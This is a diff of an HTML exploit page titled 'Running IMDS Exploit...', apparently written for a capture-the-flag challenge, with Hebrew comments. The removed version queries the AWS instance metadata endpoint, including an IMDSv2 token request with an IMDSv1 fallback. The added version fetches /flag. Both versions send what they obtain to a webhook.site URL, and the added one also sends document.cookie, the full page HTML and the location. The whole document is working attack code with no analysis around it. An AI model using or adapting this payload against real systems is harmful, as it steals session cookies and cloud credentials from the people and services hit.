@@ -7,46 +7,38 @@
 <body>
   <h1>Running IMDS Exploit...</h1>
   <script>
-    (async () => {
-      const webhookURL = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';
+(function() {
+  const base = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';
 
-      // מנסה לקבל טוקן IMDSv2
-      let tokenRes;
-      try {
-        tokenRes = await fetch('http://169.254.169.254/latest/api/token', {
-          method: 'PUT',
-          headers: {
-            'X-aws-ec2-metadata-token-ttl-seconds': '21600',
-          },
-        });
-      } catch(e) {
-        tokenRes = null;
-      }
+  // 1. ניסיון לגשת ל- /flag
+  fetch('/flag')
+    .then(r => r.text())
+    .then(flag => {
+      send('flag', flag);
+    })
+    .catch(err => {
+      send('fetch_error', err.toString());
+    });
 
-      if (!tokenRes || !tokenRes.ok) {
-        // לא הצליח לקבל טוקן - מנסה IMDSv1 (ללא טוקן)
-        try {
-          const data = await fetch('http://169.254.169.254/latest/meta-data/').then(r => r.text());
-          new Image().src = webhookURL + '?flag=' + encodeURIComponent(data);
-        } catch(e) {
-          new Image().src = webhookURL + '?error=No metadata access (IMDSv1 failed)';
-        }
-        return;
-      }
+  // 2. שליחת כל הדף
+  send('html', document.documentElement.outerHTML);
 
-      const token = await tokenRes.text();
+  // 3. שליחת קובצי עוגיות
+  send('cookie', document.cookie);
 
-      // מנסה לקבל מידע עם הטוקן
-      try {
-        const metadata = await fetch('http://169.254.169.254/latest/meta-data/', {
-          headers: { 'X-aws-ec2-metadata-token': token },
-        }).then(r => r.text());
+  // 4. שליחת location
+  send('location', location.href);
 
-        new Image().src = webhookURL + '?flag=' + encodeURIComponent(metadata);
-      } catch(e) {
-        new Image().src = webhookURL + '?error=Failed to get metadata with token';
-      }
-    })();
-  </script>
+  // 5. שליחת title
+  send('title', document.title);
+
+  // פונקציה שולחת ל-webhook
+  function send(type, data) {
+    const img = new Image();
+    img.src = `${base}?${type}=` + encodeURIComponent(data);
+  }
+})();
+</script>
 </body>
 </html>
+
